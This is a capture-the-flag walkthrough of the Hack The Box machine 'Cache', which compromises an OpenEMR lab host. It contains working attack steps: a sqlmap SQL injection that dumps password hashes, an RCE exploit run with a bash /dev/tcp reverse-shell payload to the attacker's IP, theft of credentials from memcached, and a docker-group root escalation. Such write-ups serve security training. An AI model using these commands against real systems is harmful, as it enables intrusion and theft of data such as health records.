# HTB-Cache

| key| val|
|----|----|
|OS	|Linux|
|Difficulty|	Medium
|Points|	30
|Release	|09 May 2020
|IP	|10.10.10.188

## User flag
### Services Enumeration

Nmap reveals 2 services running on the target, respectively SSH and HTTP on ports 22/tcp and 80/tcp:
```markdown
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a9:2d:b2:a0:c4:57:e7:7c:35:2d:45:4d:db:80:8c:f1 (RSA)
|   256 bc:e4:16:3d:2a:59:a1:3a:6a:09:28:dd:36:10:38:08 (ECDSA)
|_  256 57:d5:47:ee:07:ca:3a:c0:fd:9b:a8:7f:6b:4c:9d:7c (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Cache
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
---
## Web enumeration
Add the vhost to your hosts file as follows:
```markdown
$ echo "10.10.10.188 cache.htb" | sudo tee -a /etc/hosts
```
Connecting to the website (http://cache.htb) shows several static pages:
```html+
/index.html
/news.html
/contactus.html
/author.html
/login.html
```

The analysis of the login page reveals an interesting inclusion of */jquery/functionality.js* which reveals credentials:
```js
$(function(){
    
    var error_correctPassword = false;
    var error_username = false;
    
    function checkCorrectPassword(){
        var Password = $("#password").val();
        if(Password != 'H@v3_fun'){
            alert("Password didn't Match");
            error_correctPassword = true;
        }
    }
    function checkCorrectUsername(){
        var Username = $("#username").val();
        if(Username != "ash"){
            alert("Username didn't Match");
            error_username = true;
        }
    }
    $("#loginform").submit(function(event) {
        /* Act on the event */
        error_correctPassword = false;
         checkCorrectPassword();
         error_username = false;
         checkCorrectUsername();


        if(error_correctPassword == false && error_username ==false){
            return true;
        }
        else{
            return false;
        }
    });
    
});
```
Using these credentials against the login form redirects us to http://cache.htb/net.html, a page under construction, and the analysis of the other pages source code doesn’t reveal anything else.

---
## HMS vhost
However, the */author.html* page contains a hint:
```markdown
ASH is a Security Researcher (Threat Research Labs), Security Engineer. Hacker, Penetration Tester and Security blogger. He is Editor-in-Chief, Author & Creator of Cache. Check out his other projects like Cache:

HMS(Hospital Management System)
```

Add *hms.htb* to */etc/hosts* and visit http://hms.htb. It shows OpenEMR, an open source electronic health records and medical practice management solution.

---
## SQL Injection
The application is vulnerable to SQL injection. The technique is detailed in this [video](https://www.youtube.com/watch?v=DJSQ8Pk_7hc).

Fire up BurpSuite and intercept the following request: http://hms.htb/portal/add_edit_event_user.php?eid=1’, which outputs the following error message:
```ma
Query Error

ERROR: query failed: SELECT pc_facility, pc_multiple, pc_aid, facility.name FROM openemr_postcalendar_events LEFT JOIN facility ON (openemr_postcalendar_events.pc_facility = facility.id) WHERE pc_eid = 1'

Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 4

/var/www/hms.htb/public_html/portal/add_edit_event_user.php at 121:sqlQuery
```
Save the request from BurpSuite as *add_edit_event_user.xml* and use the file with *sqlmap*:
```md
kali@kali:/data/Cache/files$ sqlmap -r add_edit_event_user.xml --dbs

[REDACTED]

---
[08:46:20] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.6
[08:46:21] [INFO] fetching database names
[08:46:21] [INFO] retrieved: 'information_schema'
[08:46:21] [INFO] retrieved: 'openemr'
available databases [2]:                                                                                                                                                                    
[*] information_schema
[*] openemr

[REDACTED]
```
Now that we have listed the databases, let’s dump the tables in the *openemr* database. There are several users tables, but the one that is interesting is *users_secure*. Let’s dump the content of the table:
```md
kali@kali:/data/Cache/files$ sqlmap -r add_edit_event_user.xml -D openemr -T users_secure --dump

[REDACTED]

Database: openemr
Table: users_secure
[1 entry]
+----+--------------------------------+--------------------------------------------------------------+---------------+---------------------+---------------+---------------+-------------------+-------------------+
| id | salt                           | password                                                     | username      | last_update         | salt_history1 | salt_history2 | password_history1 | password_history2 |
+----+--------------------------------+--------------------------------------------------------------+---------------+---------------------+---------------+---------------+-------------------+-------------------+
| 1  | $2a$05$l2sTLIG6GTBeyBf7TAKL6A$ | $2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B. | openemr_admin | 2019-11-21 06:38:40 | NULL          | NULL          | NULL              | NULL              |
+----+--------------------------------+--------------------------------------------------------------+---------------+---------------------+---------------+---------------+-------------------+-------------------+

[REDACTED]
```          
---
## Crack openemr_admin’s password
The table contains the *openemr_admin*’s password hash. Save the hash and crack it with John:
```md
kali@kali:/data/Cache/files$ /data/src/john/run/john openemr_admin.hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 32 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
xxxxxx           (?)
1g 0:00:00:00 DONE (2020-09-17 08:55) 1.724g/s 1458p/s 1458c/s 1458C/s tristan..princesita
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
We now have valid credentials: *openemr_admin:xxxxxx*

---
## RCE
Using *searchsloit* reveals several vulnerabilities, but 1 of them will be interesting for us (ID *48515*).
```md
kali@kali:/data/Cache/files$ searchsploit openemr
------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                      |  Path
------------------------------------------------------------------------------------ ---------------------------------
OpenEMR - 'site' Cross-Site Scripting                                               | php/webapps/38328.txt
OpenEMR - Arbitrary '.PHP' File Upload (Metasploit)                                 | php/remote/24529.rb
OpenEMR 2.8.1 - 'fileroot' Remote File Inclusion                                    | php/webapps/1886.txt
OpenEMR 2.8.1 - 'srcdir' Multiple Remote File Inclusions                            | php/webapps/2727.txt
OpenEMR 2.8.2 - 'Import_XML.php' Remote File Inclusion                              | php/webapps/29556.txt
OpenEMR 2.8.2 - 'Login_Frame.php' Cross-Site Scripting                              | php/webapps/29557.txt
OpenEMR 3.2.0 - SQL Injection / Cross-Site Scripting                                | php/webapps/15836.txt
OpenEMR 4 - Multiple Vulnerabilities                                                | php/webapps/18274.txt
OpenEMR 4.0 - Multiple Cross-Site Scripting Vulnerabilities                         | php/webapps/36034.txt
OpenEMR 4.0.0 - Multiple Vulnerabilities                                            | php/webapps/17118.txt
OpenEMR 4.1 - '/contrib/acog/print_form.php?formname' Traversal Local File Inclusio | php/webapps/36650.txt
OpenEMR 4.1 - '/Interface/fax/fax_dispatch.php?File' 'exec()' Call Arbitrary Shell  | php/webapps/36651.txt
OpenEMR 4.1 - '/Interface/patient_file/encounter/load_form.php?formname' Traversal  | php/webapps/36649.txt
OpenEMR 4.1 - '/Interface/patient_file/encounter/trend_form.php?formname' Traversal | php/webapps/36648.txt
OpenEMR 4.1 - 'note' HTML Injection                                                 | php/webapps/38654.txt
OpenEMR 4.1.1 - 'ofc_upload_image.php' Arbitrary File Upload                        | php/webapps/24492.php
OpenEMR 4.1.1 Patch 14 - Multiple Vulnerabilities                                   | php/webapps/28329.txt
OpenEMR 4.1.1 Patch 14 - SQL Injection / Privilege Escalation / Remote Code Executi | php/remote/28408.rb
OpenEMR 4.1.2(7) - Multiple SQL Injections                                          | php/webapps/35518.txt
OpenEMR 5.0.0 - OS Command Injection / Cross-Site Scripting                         | php/webapps/43232.txt
OpenEMR 5.0.1 - 'controller' Remote Code Execution                                  | php/webapps/48623.txt
OpenEMR 5.0.1 - Remote Code Execution                                               | php/webapps/48515.py
OpenEMR 5.0.1.3 - (Authenticated) Arbitrary File Actions                            | linux/webapps/45202.txt
OpenEMR < 5.0.1 - (Authenticated) Remote Code Execution                             | php/webapps/45161.py
OpenEMR Electronic Medical Record Software 3.2 - Multiple Vulnerabilities           | php/webapps/14011.txt
Openemr-4.1.0 - SQL Injection                                                       | php/webapps/17998.txt
------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```
Save the exploit and rename it *openemr_rce.py*. Now, start a listener (*rlwrap nc -nlvp 4444*) and run the exploit:
```md
kali@kali:/data/Cache/files$ python openemr_rce.py http://hms.htb -u openemr_admin -p xxxxxx -c 'bash -i >& /dev/tcp/10.10.14.142/4444 0>&1'
 .---.  ,---.  ,---.  .-. .-.,---.          ,---.    
/ .-. ) | .-.\ | .-'  |  \| || .-'  |\    /|| .-.\   
| | |(_)| |-' )| `-.  |   | || `-.  |(\  / || `-'/   
| | | | | |--' | .-'  | |\  || .-'  (_)\/  ||   (    
\ `-' / | |    |  `--.| | |)||  `--.| \  / || |\ \   
 )---'  /(     /( __.'/(  (_)/( __.'| |\/| ||_| \)\  
(_)    (__)   (__)   (__)   (__)    '-'  '-'    (__) 
                                                       
   ={   P R O J E C T    I N S E C U R I T Y   }=    
                                                       
         Twitter : @Insecurity                       
         Site    : insecurity.sh                     

[$] Authenticating with openemr_admin:xxxxxx
[$] Injecting payload
```
A reverse shell is now available in the listener:
```md
kali@kali:/data/Cache/files$ rlwrap nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.14.142] from (UNKNOWN) [10.10.10.188] 47376
bash: cannot set terminal process group (1617): Inappropriate ioctl for device
bash: no job control in this shell
www-data@cache:/var/www/hms.htb/public_html/interface/main$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
---
## Lateral move (www-data->ash)
We already gathered ash’s password previously, let’s switch to ash.
```md
www-data@cache:/var/www/hms.htb/public_html$ python3 -c "import pty;pty.spawn('/bin/bash')"
<tml$ python3 -c "import pty;pty.spawn('/bin/bash')"
www-data@cache:/var/www/hms.htb/public_html$ su ash
su ash
Password: H@v3_fun

ash@cache:/var/www/hms.htb/public_html$ id
id
uid=1000(ash) gid=1000(ash) groups=1000(ash)
```
---
## User flag
We can now get the user flag
```md
ash@cache:/var/www/hms.htb/public_html$ cat /home/ash/user.txt
cat /home/ash/user.txt
```
---
## Root flag
### Memcached
Enumerating the network connections reveals that *memcached* is running on localhost over port *11211/tcp*.
```md
ash@cache:~$ netstat -tan
netstat -tan
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:11211         0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp        0      0 10.10.10.188:47622      10.10.14.142:4444       ESTABLISHED
tcp        0      1 10.10.10.188:41896      8.8.8.8:53              SYN_SENT   
tcp        0      0 127.0.0.1:11211         127.0.0.1:54694         TIME_WAIT  
tcp6       0      0 :::80                   :::*                    LISTEN     
tcp6       0      0 :::22                   :::*                    LISTEN     
tcp6       0      0 10.10.10.188:80         10.10.14.142:39190      TIME_WAIT  
tcp6       0      0 10.10.10.188:80         10.10.14.142:39194      ESTABLISHED
tcp6       0      0 10.10.10.188:80         10.10.14.142:39182      ESTABLISHED
tcp6       0      0 10.10.10.188:80         10.10.14.142:39196      ESTABLISHED
tcp6       0      0 10.10.10.188:80         10.10.14.142:39188      TIME_WAIT  
ash@cache:~$ ps aux | grep 11211
ps aux | grep 11211
memcache   908  0.0  0.0 425792  3976 ?        Ssl  04:55   0:01 /usr/bin/memcached -m 64 -p 11211 -u memcache -l 127.0.0.1 -P /var/run/memcached/memcached.pid
ash      20348  0.0  0.0  13136  1056 pts/0    S+   07:17   0:00 grep --color=auto 11211
```
As the service is only available for localhost, we will use *socat* to redirect the local to make the service available to the outside. Transfer *socat* to the target and use it to make a port redirection as follows:
```md
ash@cache:~$ ./socat TCP-LISTEN:11111,fork TCP:127.0.0.1:11211 &
./socat TCP-LISTEN:11111,fork TCP:127.0.0.1:11211 &
[1] 20975
```
Now, from the attacker’s machine, let’s use Metasploit to extract the cache:
```md
kali@kali:/data/Cache/files$ msfconsole -q
[*] Starting persistent handler(s)...
msf5 > use auxiliary/gather/memcached_extractor
msf5 auxiliary(gather/memcached_extractor) > show options

Module options (auxiliary/gather/memcached_extractor):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT    11211            yes       The target port (TCP)
   THREADS  1                yes       The number of concurrent threads (max one per host)

msf5 auxiliary(gather/memcached_extractor) > set rhost cache.htb
rhost => cache.htb
msf5 auxiliary(gather/memcached_extractor) > set rport 11111
rport => 11111
msf5 auxiliary(gather/memcached_extractor) > run

[+] 10.10.10.188:11111    - Found 4 keys

Keys/Values Found for 10.10.10.188:11111
========================================

 Key      Value
 ---      -----
 account  "VALUE account 0 9\r\nafhj556uo\r\nEND\r\n"
 file     "VALUE file 0 7\r\nnothing\r\nEND\r\n"
 passwd   "VALUE passwd 0 9\r\n0n3_p1ec3\r\nEND\r\n"
 user     "VALUE user 0 5\r\nluffy\r\nEND\r\n"

[+] 10.10.10.188:11111    - memcached loot stored at /home/kali/.msf4/loot/20200917093828_default_10.10.10.188_memcached.dump_842689.txt
[*] cache.htb:11111       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
The cache contains luffy’s credentials: *luffy:0n3_p1ec3*

---
## Lateral move (ash->luffy)
Let’s switch to *luffy*:
```md
ash@cache:~$ su luffy
su luffy
Password: 0n3_p1ec3

luffy@cache:/home/ash$ id
id
uid=1001(luffy) gid=1001(luffy) groups=1001(luffy),999(docker)
```
---
## Privesc (docker)
*luffy* is member of the docker group, and there is an *ubuntu* image available:
```md
luffy@cache:~$ docker images
docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
ubuntu              latest              2ca708c1c9cc        12 months ago       64.2MB
```
Checking on [GTFOBins](https://gtfobins.github.io/gtfobins/docker/#shell) reveals that we can escalate our privileges using docker.
```md
luffy@cache:~$ docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash
docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash
root@b09d72fb07c1:/# id
id
uid=0(root) gid=0(root) groups=0(root)
```
---
## Root flag
Now that we have successfully escalated our privileges, let’s get the root flag:
```md
root@b09d72fb07c1:/# cat /root/root.txt
cat /root/root.txt
```
